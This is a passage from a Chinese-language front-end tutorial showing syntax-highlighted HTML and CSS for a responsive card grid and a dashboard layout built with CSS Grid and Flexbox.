          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-tags"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>响应式<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>布局<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-btn"</span>&gt;</span>查看详情<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://picsum.photos/seed/card5/600/400"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"卡片图片"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-img"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>Vue.js 3 新特性<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-description"</span>&gt;</span>探索 Vue.js 3 的新特性，包括 Composition API、Teleport、Suspense 等高级功能。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-tags"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>Vue.js<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>Composition API<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>前端框架<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-btn"</span>&gt;</span>查看详情<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://picsum.photos/seed/card6/600/400"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"卡片图片"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-img"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>性能优化<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-description"</span>&gt;</span>学习前端性能优化的策略和技巧，提升网站加载速度和用户体验。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-tags"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>性能优化<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>Web Vitals<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>用户体验<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-btn"</span>&gt;</span>查看详情<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>在这个例子中，我们使用了：</p>
<ul>
<li><strong>CSS Grid</strong> 实现卡片的二维网格布局（<code>card-grid</code> 类）</li>
<li><strong>Flexbox</strong> 实现卡片内部的垂直布局和内容分布（<code>card</code> 和 <code>card-content</code> 类）</li>
<li><strong>响应式设计</strong> 确保在不同设备上都有良好的显示效果</li>
</ul>
<h3 data-id="heading-8">🎯 进阶实现：复杂仪表板布局</h3>
<p>现在让我们实现一个更复杂的仪表板布局，展示如何结合CSS Grid和Flexbox处理更复杂的设计需求。</p>
<h4 data-id="heading-9">1. 需求分析</h4>
<p>我们需要实现一个响应式仪表板，包含以下组件：</p>
<ul>
<li>顶部导航栏</li>
<li>侧边菜单栏</li>
<li>主要内容区域，包含：
<ul>
<li>数据概览卡片（4个）</li>
<li>主要图表（1个大图表）</li>
<li>辅助数据卡片（2个）</li>
<li>数据表格</li>
</ul>
</li>
<li>右侧信息栏</li>
</ul>
<h4 data-id="heading-10">2. 实现代码</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSS Grid + Flexbox 复杂仪表板布局<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    <span class="hljs-comment">/* 全局样式 */</span>
    * {
      <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
      <span class="hljs-attribute">box-sizing</span>: border-box;
    }
    
    <span class="hljs-selector-tag">body</span> {
      <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Segoe UI'</span>, Tahoma, Geneva, Verdana, sans-serif;
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f0f2f5</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
      <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.6</span>;
    }
    
    <span class="hljs-comment">/* 整体布局 */</span>
    <span class="hljs-selector-class">.dashboard</span> {
      <span class="hljs-attribute">display</span>: grid;
      <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">250px</span> <span class="hljs-number">1</span>fr <span class="hljs-number">300px</span>;
      <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">60px</span> <span class="hljs-number">1</span>fr;
      <span class="hljs-attribute">grid-template-areas</span>: 
        <span class="hljs-string">"sidebar header rightbar"</span>
        <span class="hljs-string">"sidebar main rightbar"</span>;
      <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
      <span class="hljs-attribute">overflow</span>: hidden;
    }
    
    <span class="hljs-comment">/* 顶部导航栏 */</span>
    <span class="hljs-selector-class">.header</span> {
      <span class="hljs-attribute">grid-area</span>: header;
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">justify-content</span>: space-between;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;
    }
    
    <span class="hljs-selector-class">.header-left</span> {
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">gap</span>: <span class="hljs-number">15px</span>;
    }
    
    <span class="hljs-selector-class">.header-right</span> {
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">gap</span>: <span class="hljs-number">15px</span>;
    }
    
    <span class="hljs-comment">/* 侧边菜单栏 */</span>
    <span class="hljs-selector-class">.sidebar</span> {
      <span class="hljs-attribute">grid-area</span>: sidebar;
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#2c3e50</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span> <span class="hljs-number">0</span>;
      <span class="hljs-attribute">overflow-y</span>: auto;
    }
    
    <span class="hljs-selector-class">.logo</span> {
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.5rem</span>;
      <span class="hljs-attribute">font-weight</span>: bold;
      <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
    }
    
    <span class="hljs-selector-class">.menu</span> {
      <span class="hljs-attribute">list-style</span>: none;
    }
    
    <span class="hljs-selector-class">.menu-item</span> {
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">5px</span>;
    }
    
    <span class="hljs-selector-class">.menu-item</span> <span class="hljs-selector-tag">a</span> {
      <span class="hljs-attribute">display</span>: block;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span> <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.8</span>);
      <span class="hljs-attribute">text-decoration</span>: none;
      <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.3s</span> ease, color <span class="hljs-number">0.3s</span> ease;
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>;
    }
    
    <span class="hljs-selector-class">.menu-item</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>, <span class="hljs-selector-class">.menu-item</span><span class="hljs-selector-class">.active</span> <span class="hljs-selector-tag">a</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#3498db</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
    }
    
    <span class="hljs-comment">/* 主要内容区域 */</span>
    <span class="hljs-selector-class">.main</span> {
      <span class="hljs-attribute">grid-area</span>: main;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">overflow-y</span>: auto;
    }
    
    <span class="hljs-comment">/* 数据概览卡片 */</span>
    <span class="hljs-selector-class">.overview-cards</span> {
      <span class="hljs-attribute">display</span>: grid;
      <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fit, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">200px</span>, <span class="hljs-number">1</span>fr));
      <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">25px</span>;
    }
    
    <span class="hljs-selector-class">.overview-card</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">gap</span>: <span class="hljs-number">15px</span>;
      <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span> ease, box-shadow <span class="hljs-number">0.3s</span> ease;
    }
    
    <span class="hljs-selector-class">.overview-card</span><span class="hljs-selector-pseudo">:hover</span> {
      <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">2px</span>);
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">12px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.15</span>);
    }
    
    <span class="hljs-selector-class">.card-icon</span> {
      <span class="hljs-attribute">width</span>: <span class="hljs-number">50px</span>;
      <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">justify-content</span>: center;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.5rem</span>;
    }
    
    <span class="hljs-selector-class">.card-icon</span><span class="hljs-selector-class">.primary</span> { <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e3f2fd</span>; <span class="hljs-attribute">color</span>: <span class="hljs-number">#1976d2</span>; }
    <span class="hljs-selector-class">.card-icon</span><span class="hljs-selector-class">.success</span> { <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e8f5e9</span>; <span class="hljs-attribute">color</span>: <span class="hljs-number">#43a047</span>; }
    <span class="hljs-selector-class">.card-icon</span><span class="hljs-selector-class">.warning</span> { <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff3e0</span>; <span class="hljs-attribute">color</span>: <span class="hljs-number">#f57c00</span>; }
    <span class="hljs-selector-class">.card-icon</span><span class="hljs-selector-class">.danger</span> { <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ffebee</span>; <span class="hljs-attribute">color</span>: <span class="hljs-number">#d32f2f</span>; }
    
    <span class="hljs-selector-class">.card-info</span> <span class="hljs-selector-tag">h3</span> {
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.5rem</span>;
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">5px</span>;
    }
    
    <span class="hljs-selector-class">.card-info</span> <span class="hljs-selector-tag">p</span> {
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9rem</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#7f8c8d</span>;
    }
    
    <span class="hljs-comment">/* 主要图表 */</span>
    <span class="hljs-selector-class">.main-chart</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">25px</span>;
    }
    
    <span class="hljs-comment">/* 辅助数据卡片 */</span>
    <span class="hljs-selector-class">.secondary-cards</span> {
      <span class="hljs-attribute">display</span>: grid;
      <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fit, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">300px</span>, <span class="hljs-number">1</span>fr));
      <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">25px</span>;
    }
    
    <span class="hljs-selector-class">.secondary-card</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
    }
    
    <span class="hljs-comment">/* 数据表格 */</span>
    <span class="hljs-selector-class">.data-table</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
      <span class="hljs-attribute">overflow-x</span>: auto;
    }
    
    <span class="hljs-selector-tag">table</span> {
      <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
      <span class="hljs-attribute">border-collapse</span>: collapse;
    }
    
    <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span> {
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;
      <span class="hljs-attribute">text-align</span>: left;
      <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#e0e0e0</span>;
    }
    
    <span class="hljs-selector-tag">th</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;
      <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
    }
    
    <span class="hljs-selector-tag">tr</span><span class="hljs-selector-pseudo">:hover</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fafafa</span>;
    }
    
    <span class="hljs-comment">/* 右侧信息栏 */</span>
    <span class="hljs-selector-class">.rightbar</span> {
      <span class="hljs-attribute">grid-area</span>: rightbar;
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">box-shadow</span>: -<span class="hljs-number">2px</span> <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">overflow-y</span>: auto;
    }
    
    <span class="hljs-selector-class">.widget</span> {
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">25px</span>;
    }
    
    <span class="hljs-selector-class">.widget-title</span> {
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.2rem</span>;
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">15px</span>;
      <span class="hljs-attribute">padding-bottom</span>: <span class="hljs-number">10px</span>;
      <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#e0e0e0</span>;
    }
    
    <span class="hljs-comment">/* 响应式设计 */</span>
    <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">1200px</span>) {
      <span class="hljs-selector-class">.dashboard</span> {
        <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">220px</span> <span class="hljs-number">1</span>fr <span class="hljs-number">250px</span>;
      }
    }
    
    <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">992px</span>) {
      <span class="hljs-selector-class">.dashboard</span> {
        <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr;
        <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">60px</span> auto <span class="hljs-number">1</span>fr;
        <span class="hljs-attribute">grid-template-areas</span>: 
          <span class="hljs-string">"header"</span>
          <span class="hljs-string">"main"</span>
          <span class="hljs-string">"rightbar"</span>;
      }
      
      <span class="hljs-selector-class">.sidebar</span> {
        <span class="hljs-attribute">display</span>: none;
      }
      
      <span class="hljs-selector-class">.rightbar</span> {
        <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> -<span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
        <span class="hljs-attribute">max-height</span>: <span class="hljs-number">300px</span>;
      }
    }
    
    <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) {
      <span class="hljs-selector-class">.overview-cards</span> {
        <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>fr);
      }
      
      <span class="hljs-selector-class">.secondary-cards</span> {
        <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr;
      }
      
      <span class="hljs-selector-class">.header-right</span> {
        <span class="hljs-attribute">display</span>: none;
      }
    }
    
    <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">480px</span>) {
      <span class="hljs-selector-class">.overview-cards</span> {
        <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr;
      }
      
      <span class="hljs-selector-class">.main</span> {
        <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
      }
      
      <span class="hljs-selector-class">.rightbar</span> {
        <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
      }
    }
    
    <span class="hljs-comment">/* 模拟数据 */</span>
    <span class="hljs-selector-class">.chart-placeholder</span> {
      <span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>;
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">justify-content</span>: center;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#7f8c8d</span>;
    }
    
    <span class="hljs-selector-class">.card-placeholder</span> {
      <span class="hljs-attribute">height</span>: <span class="hljs-number">150px</span>;
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">justify-content</span>: center;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#7f8c8d</span>;
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dashboard"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 顶部导航栏 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header-left"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu-toggle"</span>&gt;</span>☰<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Dashboard<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header-right"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>通知<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>用户<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 侧边菜单栏 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">aside</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"sidebar"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo"</span>&gt;</span>Logo<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu-item active"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>🏠 仪表盘<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu-item"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>📊 数据统计<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu-item"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>📈 数据分析<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
